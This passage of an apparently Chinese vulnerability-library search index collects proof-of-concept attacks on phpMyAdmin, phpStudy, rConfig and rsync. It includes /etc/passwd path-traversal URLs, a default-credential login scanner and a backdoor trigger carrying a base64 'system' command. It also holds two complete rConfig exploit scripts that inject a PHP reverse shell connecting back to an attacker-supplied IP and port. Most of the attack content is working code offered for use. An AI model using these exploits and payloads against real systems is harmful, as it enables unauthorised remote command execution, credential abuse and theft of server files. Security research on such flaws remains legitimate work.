4.8.0-4.8.1</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<pre><code>http://**********/index?target=db_sql.php%253f/../../../../../../../../etc/passwd \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpmyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-12613/","title":"\u6f0f\u6d1e\u7f16\u53f7","text":"<p>CVE-2018-12613</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpmyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-12613/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>phpMyAdmin 4.8.0\u548c4.8.1\u53d7\u5230\u5f71\u54cd\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpmyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-12613/#_3","title":"\u5229\u7528","text":"<p>http://ip:8080/phpMyAdmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpMyAdmin/phpmyadmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-12613/#_4","title":"\u66f4\u591a","text":"<p>https://blog.csdn.net/qq_33020901/article/details/80829269</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","title":"phpStudy nginx \u89e3\u6790\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<pre><code>\u5f71\u54cd\u7248\u672c\uff1aphpstudy &lt;= 8.1.0.7\nphpstudy \u5b58\u5728 nginx \u89e3\u6790\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5229\u7528\u4e0a\u4f20\u529f\u80fd\uff0c\u5c06\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684\u5408\u6cd5\u6587\u4ef6\u7c7b\u578b\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\uff0c\u4ece\u800c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5f71\u54cd\u3002\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_2","title":"\u73af\u5883\u642d\u5efa","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#phpstudy-v8107","title":"\u4e0b\u8f7dphpstudy v8.1.0.7\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\u5982\u4e0b\uff1a","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_4","title":"\u6b63\u5e38\u8bbf\u95ee\u56fe\u7247\uff1a","text":"<pre><code>http://192.168.3.142:8088/123.gif\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_5","title":"\u589e\u52a0\u540e\u7f00\u8bbf\u95ee\u5982\u4e0b\uff1a","text":"<pre><code>\u6210\u529f\u89e3\u6790php\u6587\u4ef6\nhttp://192.168.3.142:8088/123.gif/xxx.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_6","title":"\u6f0f\u6d1e\u5206\u6790","text":"<pre><code>\u8be5\u6f0f\u6d1e\u5c5e\u4e8e\u5b89\u5168\u914d\u7f6e\u9519\u8bef\u6f0f\u6d1e\u3002\n\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u4e3a\uff1a\n1\u3001\u7531\u4e8e\u914d\u7f6e\u9519\u8bef\uff0c\u5bfc\u81f4 nginx \u628a\u4ee5 .php \u7ed3\u5c3e\u7684\u6587\u4ef6\u4ea4\u7ed9 fastcgi \u5904\u7406\uff0c\u56e0\u6b64\u53ef\u4ee5\u6784\u9020 http://192.168.3.142:8088/123.gif/xxx.php\uff08\u4efb\u4f55\u670d\u52a1\u5668\u7aef\u4e0d\u5b58\u5728\u7684php\u6587\u4ef6\u5747\u53ef\uff0c\u6bd4\u5982X.php\uff09\n2\u3001\u4f46\u662f fastcgi \u5728\u5904\u7406 xxx.php \u6587\u4ef6\u65f6\u53d1\u73b0\u6587\u4ef6\u5e76\u4e0d\u5b58\u5728\uff0c\u8fd9\u65f6 php.ini \u914d\u7f6e\u6587\u4ef6\u4e2d cgi.fix_pathinfo=1 \u53d1\u6325\u4f5c\u7528\uff0c\u8fd9\u9879\u914d\u7f6e\u7528\u4e8e\u4fee\u590d\u8def\u5f84\uff0c\u5982\u679c\u5f53\u524d\u8def\u5f84\u4e0d\u5b58\u5728\u5219\u91c7\u7528\u4e0a\u5c42\u8def\u5f84\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea4\u7531 fastcgi \u5904\u7406\u7684\u6587\u4ef6\u5c31\u53d8\u6210\u4e86 /123.gif.\n3\u3001\u6700\u91cd\u8981\u7684\u4e00\u70b9\u662f php-fpm.conf \u4e2d\u7684 security.limit_extensions \u914d\u7f6e\u9879\u9650\u5236\u4e86 fastcgi \u89e3\u6790\u6587\u4ef6\u7684\u7c7b\u578b\uff08\u5373\u6307\u5b9a\u4ec0\u4e48\u7c7b\u578b\u7684\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790\uff09\uff0c\u6b64\u9879\u8bbe\u7f6e\u4e3a\u7a7a\u7684\u65f6\u5019\u624d\u5141\u8bb8 fastcgi \u5c06 .png \u7b49\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790.\n</code></pre> <p>\u200b    \u5206\u7c7b:             Web\u5b89\u5168</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpmyadmin_defaultpwd/","title":"Phpmyadmin defaultpwd","text":"<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n'''\nname: phpstudy phpmyadmin\u9ed8\u8ba4\u5bc6\u7801\u6f0f\u6d1e\nreferer: wooyun-2015-094933\nauthor: Lucifer\ndescription: phpstudy\u7684\u9ed8\u8ba4phpmyadmin\u540e\u53f0\u5b58\u5728\u9ed8\u8ba4\u7528\u6237\u540d\u5bc6\u7801\u53ef\u5199shell\u3002\n'''\nimport sys\nimport json\nimport requests\nimport warnings\ndef run(url):\n        result = ['phpstudy phpmyadmin\u9ed8\u8ba4\u5bc6\u7801\u6f0f\u6d1e','','']\n        headers = {\n            \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\",\n            \"Content-Type\":\"application/x-www-form-urlencoded\",\n        }\n        payload = \"/phpmyadmin/index.php\"\n        vulnurl = url + payload\n        post_data = {\n            \"pma_username\":\"root\",\n            \"pma_password\":\"root\",\n            \"server\":\"1\",\n            \"target\":\"index.php\"\n        }\n        try:\n            sess = requests.Session()\n            req = sess.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)\n            req2 = sess.get(vulnurl, headers=headers, timeout=10, verify=False)\n            if r\"navigation.php\" in req2.text and r\"frame_navigation\" in req.text:\n                result[2]=  '\u5b58\u5728'\n                result[1] = vulnurl+\"\\tpost: \"+json.dumps(post_data, indent=4)\n            else:\n                result[2]=  '\u4e0d\u5b58\u5728'\n\n        except:\n            result[2]='\u4e0d\u5b58\u5728'\n        return result\n\nif __name__ == \"__main__\":\n    warnings.filterwarnings(\"ignore\")\n    testVuln = run(sys.argv[1])\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy_backdoor/","title":"Phpstudy backdoor","text":"<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n'''\nname: phpstudy\u540e\u95e8\nreferer: unknown\nauthor: qianxiao996\ndescription: phpstudy\u540e\u95e8\u63a2\u6d4b\n'''\nimport sys\nimport requests\nimport warnings\nimport base64\ndef run(url):\n        result = ['phpstudy\u540e\u95e8', '', '']\n        payload = \"echo \\\"testdoor\\\";\"\n        payload = base64.b64encode(payload.encode('utf-8'))\n        payload = str(payload, 'utf-8')\n        headers = {\n            'Upgrade-Insecure-Requests': '1',\n            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',\n            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\n            'Accept-Language': 'zh-CN,zh;q=0.9',\n            'accept-charset': payload,\n            'Accept-Encoding': 'gzip,deflate',\n            'Connection': 'close',\n        }\n        try:\n            req = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=30)\n            if \"testdoor\" in req.text:\n                result[2]=  '\u5b58\u5728'\n            else:\n                result[2]=  '\u4e0d\u5b58\u5728'\n        except:\n            result[2]=  '\u4e0d\u5b58\u5728'\n        # print(result)\n        return result\nif __name__ == \"__main__\":\n    warnings.filterwarnings(\"ignore\")\n    testVuln = run(sys.argv[1])\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E5%90%8E%E9%97%A8/","title":"\u6f0f\u6d1e\u7248\u672c","text":"<p>phpstudy\u540e\u95e8</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E5%90%8E%E9%97%A8/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>phpstudy 2016\u7248php-5.4 phpstudy 2018\u7248php-5.2.17 phpstudy 2018\u7248php-5.4.45</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E5%90%8E%E9%97%A8/#_3","title":"\u5229\u7528","text":"<p>\u6d4f\u89c8\u4e3b\u9875\u6293\u5305</p> <p>\u53bb\u6389Accept-Encoding:gzip, defate\u9017\u53f7\u540e\u9762\u7684\u7a7a\u683c\u53bb\u6389\uff0c\u5426\u5219\u547d\u4ee4\u6267\u884c\u4f1a\u5931\u8d25</p> <p>\u5728\u8bf7\u6c42\u5934\u6dfb\u52a0 accept-charset:ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7</p> <p>\u5bc6\u6587\u5185\u5bb9\u4e3a echo system('net user');</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","title":"!/usr/bin/env python","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/phpstudy/phpstudy%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#-coding-utf-8-","title":"-- coding: utf-8 --","text":"<p>''' name: phpstudy\u63a2\u9488 referer: unknown author: Lucifer description: phpstudy\u9ed8\u8ba4\u5b58\u5728\u63a2\u9488l.php,\u6cc4\u9732\u654f\u611f\u4fe1\u606f\u3002 ''' import sys import requests import warnings def run(url):         result = ['phpstudy\u63a2\u9488', '', '']         headers = {             \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\"         }         payload = \"/l.php\"         vulnurl = url + payload         try:             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)             if r\"phpStudy\" in req.text and r\"php_version\" in req.text:                 result[2]=  '\u5b58\u5728'                 result[1] = vulnurl             else:                 result[2]=  '\u4e0d\u5b58\u5728'</p> <pre><code>    except:\n        result[2]='\u4e0d\u5b58\u5728'\n    return result\n</code></pre> <p>if name == \"main\":     warnings.filterwarnings(\"ignore\")     testVuln = run(sys.argv[1])</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/","title":"rConfig v3.9.2 RCE\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#rconfig-v392-rce","title":"rConfig v3.9.2 RCE\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#0x00","title":"0x00 \u524d\u8a00","text":"<p>rConfig\u662f\u4e00\u4e2a\u5f00\u6e90\u7f51\u7edc\u8bbe\u5907\u914d\u7f6e\u7ba1\u7406\u89e3\u51b3\u65b9\u6848\uff0c\u53ef\u4ee5\u65b9\u4fbf\u7f51\u7edc\u5de5\u7a0b\u5e08\u5feb\u901f\u3001\u9891\u7e41\u7ba1\u7406\u7f51\u7edc\u8bbe\u5907\u5feb\u7167\u3002</p> <p>\u6211\u5728rConfig\u7684\u4e24\u4e2a\u6587\u4ef6\u4e2d\u627e\u5230\u4e86\u4e24\u4e2a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff08RCE\uff09\u6f0f\u6d1e\uff0c\u7b2c\u4e00\u4e2a\u6587\u4ef6\u4e3a<code>ajaxServerSettingsChk.php</code>\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7<code>rootUname</code>\u53c2\u6570\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u4e00\u4e2aGET\u8bf7\u6c42\uff0c\u89e6\u53d1\u672a\u6388\u6743RCE\u6f0f\u6d1e\u3002<code>rootUname</code>\u53c2\u6570\u5728\u6e90\u6587\u4ef6\u7b2c2\u884c\u4e2d\u5b9a\u4e49\uff0c\u968f\u540e\u4f1a\u5728\u7b2c13\u884c\u4f20\u9012\u7ed9<code>exec</code>\u51fd\u6570\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u63d2\u5165\u8be5\u53c2\u6570\u4e2d\uff0c\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u548c\u53d1\u73b0\u8fc7\u7a0b\u6bd4\u8f83\u7b80\u5355\uff0c\u4e0b\u6587\u4e2d\u6211\u5c06\u4ecb\u7ecd\u5982\u4f55\u53d1\u73b0\u5e76\u5229\u7528\u8be5\u6f0f\u6d1e\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u6f0f\u6d1e\u4f4d\u4e8e<code>search.crud.php</code>\u6587\u4ef6\u4e2d\uff0c\u5b58\u5728RCE\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684GET\u8bf7\u6c42\u89e6\u53d1\u8be5\u6f0f\u6d1e\uff0c\u8bf7\u6c42\u4e2d\u5305\u542b\u4e24\u4e2a\u53c2\u6570\uff0c\u5176\u4e2d<code>searchTerm</code>\u53c2\u6570\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u503c\uff0c\u4f46\u8be5\u53c2\u6570\u5fc5\u987b\u5b58\u5728\uff0c\u624d\u80fd\u6267\u884c\u5230\u7b2c63\u884c\u7684<code>exec</code>\u51fd\u6570\u3002</p> <p>\u6211\u50cf\u5f80\u5e38\u4e00\u6837\u60f3\u5bfb\u627eRCE\u6f0f\u6d1e\uff0c\u56e0\u6b64\u6211\u4f7f\u7528\u81ea\u5df1\u5f00\u53d1\u7684\u4e00\u4e2apython\u811a\u672c\u6765\u641c\u7d22\u6240\u6709\u4e0d\u5b89\u5168\u7684\u51fd\u6570\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#0x01-rce","title":"0x01 \u672a\u6388\u6743RCE\u6f0f\u6d1e","text":"<p>\u8fd0\u884c\u811a\u672c\u540e\uff0c\u6211\u770b\u5230\u4e86\u4e00\u4e9b\u8f93\u51fa\u7ed3\u679c\u3002\u68c0\u67e5\u6587\u4ef6\u540e\uff0c\u6211\u53d1\u73b0\u6709\u4e2a\u6587\u4ef6\u540d\u4e3a<code>ajaxServerSettingsChk.php</code>\uff0c\u5177\u4f53\u8def\u5f84\u4e3a<code>install/lib/ajaxHandlers/ajaxServerSettingsChk.php</code>\uff0c\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>&lt;?php\n$rootUname = $_GET['rootUname'];    // line 2\n$array = array();\n/* check PHP Safe_Mode is off */\nif (ini_get('safe_mode')) {\n    $array['phpSafeMode'] = '&amp;amp;amp;lt;strong&amp;amp;amp;gt;&amp;amp;amp;lt;font class=&amp;amp;amp;quot;bad&amp;amp;amp;quot;&amp;amp;amp;gt;Fail - php safe mode is on - turn it off before you proceed with the installation&amp;amp;amp;lt;/strong&amp;amp;amp;gt;&amp;amp;amp;lt;/font&amp;amp;amp;gt;br/&amp;amp;amp;gt;';\n} else {\n    $array['phpSafeMode'] = '&amp;amp;amp;lt;strong&amp;amp;amp;gt;&amp;amp;amp;lt;font class=&amp;amp;amp;quot;Good&amp;amp;amp;quot;&amp;amp;amp;gt;Pass - php safe mode is off&amp;amp;amp;lt;/strong&amp;amp;amp;gt;&amp;amp;amp;lt;/font&amp;amp;amp;gt;&amp;amp;amp;lt;br/&amp;amp;amp;gt;';\n}\n\n/* Test root account details */\n$rootTestCmd1 = 'sudo -S -u ' . $rootUname . ' chmod 0777 /home 2&amp;amp;amp;gt;&amp;amp;amp;amp;1';    // line 12\nexec($rootTestCmd1, $cmdOutput, $err);    // line 13\n$homeDirPerms = substr(sprintf('%o', fileperms('/home')), -4);\nif ($homeDirPerms == '0777') {\n    $array['rootDetails'] = '&amp;amp;amp;lt;strong&amp;amp;amp;gt;&amp;amp;amp;lt;font class=&amp;amp;amp;quot;Good&amp;amp;amp;quot;&amp;amp;amp;gt;Pass - root account details are good &amp;amp;amp;lt;/strong&amp;amp;amp;gt;&amp;amp;amp;lt;/font&amp;amp;amp;gt;&amp;amp;amp;lt;br/&amp;amp;amp;gt;';\n} else {\n    $array['rootDetails'] = '&amp;amp;amp;lt;strong&amp;amp;amp;gt;&amp;amp;amp;lt;font class=&amp;amp;amp;quot;bad&amp;amp;amp;quot;&amp;amp;amp;gt;The root details provided have not passed: ' . $cmdOutput[0] . '&amp;amp;amp;lt;/strong&amp;amp;amp;gt;&amp;amp;amp;lt;/font&amp;amp;amp;gt;&amp;amp;amp;lt;br/&amp;amp;amp;gt;';\n}\n// reset /home dir permissions\n$rootTestCmd2 = 'sudo -S -u ' . $rootUname . ' chmod 0755 /home 2&amp;amp;amp;gt;&amp;amp;amp;amp;1';    // line 21\nexec($rootTestCmd2, $cmdOutput, $err);    // line 22\n\necho json_encode($array);\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#poc-x1","title":"POC x1","text":"<pre><code>#!/usr/bin/python\n\n# Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution\n# Date: 18/09/2019\n# Exploit Author: Askar (@mohammadaskar2)\n# CVE : CVE-2019-16662\n# Vendor Homepage: https://rconfig.com/\n# Software link: https://rconfig.com/download\n# Version: v3.9.2\n# Tested on: CentOS 7.7 / PHP 7.2.22\n\nimport requests\nimport sys\nfrom urllib import quote\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nif len(sys.argv) != 4:\n    print \"[+] Usage : ./exploit.py target ip port\"\n    exit()\n\ntarget = sys.argv[1]\n\nip = sys.argv[2]\n\nport = sys.argv[3]\n\npayload = quote(''';php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3\");'#'''.format(ip, port))\n\ninstall_path = target + \"/install\"\n\nreq = requests.get(install_path, verify=False)\nif req.status_code == 404:\n    print \"[-] Installation directory not found!\"\n    print \"[-] Exploitation failed !\"\n    exit()\nelif req.status_code == 200:\n    print \"[+] Installation directory found!\"\nurl_to_send = target + \"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=\" + payload\n\nprint \"[+] Triggering the payload\"\nprint \"[+] Check your listener !\"\n\nrequests.get(url_to_send, verify=False)\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#poc-x2","title":"POC x2","text":"<pre><code>#!/usr/bin/python\n\n# Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution\n# Date: 18/09/2019\n# Exploit Author: Askar (@mohammadaskar2)\n# CVE : CVE-2019-16663\n# Vendor Homepage: https://rconfig.com/\n# Software link: https://rconfig.com/download\n# Version: v3.9.2\n# Tested on: CentOS 7.7 / PHP 7.2.22\n\n\nimport requests\nimport sys\nfrom urllib import quote\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nif len(sys.argv) != 6:\n    print \"[+] Usage : ./exploit.py target username password ip port\"\n    exit()\n\ntarget = sys.argv[1]\n\nusername = sys.argv[2]\n\npassword = sys.argv[3]\n\nip = sys.argv[4]\n\nport = sys.argv[5]\n\nrequest = requests.session()\n\nlogin_info = {\n    \"user\": username,\n    \"pass\": password,\n    \"sublogin\": 1\n}\n\nlogin_request = request.post(\n    target+\"/lib/crud/userprocess.php\",\n     login_info,\n     verify=False,\n     allow_redirects=True\n )\n\ndashboard_request = request.get(target+\"/dashboard.php\", allow_redirects=False)\n\n\nif dashboard_request.status_code == 200:\n    print \"[+] LoggedIn successfully\"\n    payload = '''\"\"&amp;amp;&amp;amp;php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3\");'#'''.format(ip, port)\n    encoded_request = target+\"/lib/crud/search.crud.php?searchTerm=anything&amp;amp;catCommand={0}\".format(quote(payload))\n    print \"[+] triggering the payload\"\n    print \"[+] Check your listener !\"\n    exploit_req = request.get(encoded_request)\n\nelif dashboard_request.status_code == 302:\n    print \"[-] Wrong credentials !\"\n    exit()\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#httpsshellssystemsrconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662","title":"\u539f\u6587\uff1a https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E/#httpswwwanquankecompostid189795","title":"\u82f1\u8bd1\u4e2d\uff1a https://www.anquanke.com/post/id/189795","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rsyns/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","title":"rsync \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rsyns/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","title":"\u524d\u8a00","text":"<p>rsync\u662fLinux\u4e0b\u4e00\u6b3e\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u652f\u6301\u901a\u8fc7rsync\u534f\u8bae\u3001ssh\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u6587\u4ef6\u4f20\u8f93\u3002\u5176\u4e2drsync\u534f\u8bae\u9ed8\u8ba4\u76d1\u542c873\u7aef\u53e3\uff0c\u5982\u679c\u76ee\u6807\u5f00\u542f\u4e86rsync\u670d\u52a1\uff0c\u5e76\u4e14\u6ca1\u6709\u914d\u7f6eACL\u6216\u8bbf\u95ee\u5bc6\u7801\uff0c\u6211\u4eec\u5c06\u53ef\u4ee5\u8bfb\u5199\u76ee\u6807\u670d\u52a1\u5668\u6587\u4ef6\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rsyns/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_2","title":"\u73af\u5883\u642d\u5efa","text":"<p><code>cd vulhub/rsync/common  `````` docker-compose build &amp;&amp; docker-compose build</code>\u73af\u5883\u542f\u52a8\u540e\uff0c\u6211\u4eec\u7528rsync\u547d\u4ee4\u8bbf\u95ee\u4e4b\uff1a \u6709\u4e00\u4e2asrc\u6a21\u5757\uff0c\u6211\u4eec\u518d\u5217\u51fa\u8fd9\u4e2a\u6a21\u5757\u4e0b\u7684\u6587\u4ef6\uff1a<code>rsync rsync://your-ip:873/src/</code> \u8fd9\u662f\u4e00\u4e2aLinux\u6839\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0b\u8f7d\u4efb\u610f\u6587\u4ef6\uff1a<code>rsync -av rsync://your-ip:873/src/etc/passwd 